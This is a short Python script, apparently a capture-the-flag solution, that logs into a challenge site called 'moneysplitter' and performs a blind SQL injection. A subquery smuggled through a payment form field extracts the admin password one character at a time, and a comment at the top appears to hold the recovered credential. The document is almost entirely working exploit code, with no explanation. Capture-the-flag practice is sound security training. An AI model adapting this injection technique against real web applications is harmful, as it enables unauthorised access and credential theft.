# admin:e55b1878-0c77-4ae2-a69a-7fb77911

import requests
import re

url = 'https://moneysplitter.ctf.m0lecon.it'

s = requests.Session()

login_data = {
    'username': 'leo3',
    'password': 'leo3'
}

s.post(url + '/auth/login', data=login_data)

chars = "1234567890abcdef-"
password = ''

prev_val = 1
val = 1
while True:
    for ch in chars:
        payload = "(SELECT 1 FROM user WHERE username='admin' AND password LIKE '{}{}%' LIMIT 1)".format(password, ch)
        my_data = {
            'reason': 'test2',
            'participants[10][cost]': '1',
            'participants[11][cost]': '0',
            'participants[11][include]': payload
        }

        s.post(url + '/payments/add', data=my_data)
        r = s.get(url + '/dashboard/')
        if 'owes' in r.text and '/i> {}.0'.format(val) in r.text:
            val += 1
            password += ch
            print(password)
            break

    if prev_val == val:
        print('Admin Password: {}'.format(password))
        break
    else:
        prev_val += 1